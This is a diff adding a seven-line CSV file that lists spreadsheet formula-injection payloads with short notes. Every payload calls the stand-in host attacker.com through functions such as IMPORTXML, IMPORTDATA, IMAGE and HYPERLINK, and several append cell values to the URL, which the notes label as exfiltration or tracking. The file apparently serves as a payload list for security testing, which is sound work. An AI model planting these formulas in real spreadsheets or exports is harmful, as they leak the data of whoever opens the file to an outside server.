@@ -1,0 +1,7 @@
+Payload,Notes
+=IMPORTXML("http://attacker.com/"&A1,"//a"),fetch + exfil
+=IMPORTFEED("http://attacker.com/rss"),external feed fetch
+=IMPORTHTML("http://attacker.com/","table",1),fetch external HTML
+=IMPORTDATA("http://attacker.com/?x="&A2),fetch with param
+=IMAGE("http://attacker.com/track.gif?id="&A1),pixel tracking
+=HYPERLINK("http://attacker.com/?d="&ENCODEURL(A1),"click"),URL-encoded exfil
